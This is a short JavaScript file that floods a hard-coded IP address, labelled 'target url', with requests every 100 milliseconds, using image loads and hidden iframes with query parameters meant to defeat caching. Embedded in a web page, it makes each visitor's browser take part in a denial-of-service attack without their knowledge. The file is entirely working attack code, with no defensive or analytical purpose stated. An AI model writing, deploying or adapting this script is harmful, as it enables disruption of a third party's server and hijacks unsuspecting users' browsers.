// Constants for url, request sending interval, message.

const Url = 'http://51.15.25.108'; // target url
const Interval = 100; // request sending interval (100 milliseconds)
const Message = 'Hello server!'; // Message
const random1 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999); // random number 1
const random2 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999); // random number 2

// Function to send requests to target url with message.
function sendRequestToTarget() {

  // Create an Image element In HTML for request sending
  const img = new Image();
  img.src = `${Url}?r=${random1}&msg=${Message}`;

  // Use iframe for sending more requests
  const iframe = document.createElement('iframe');
  iframe.src = `${Url}?cacheBuster=${random2}&msg=${Message}`;
  iframe.style.display = 'none';
  document.body.appendChild(iframe);

  // Clear images and iframe for removing lags from page.
  setTimeout(() => {
    img.remove();
    iframe.remove();
  }, 1); // Adjust the delay as needed
}


setInterval(sendRequestToTarget, Interval);

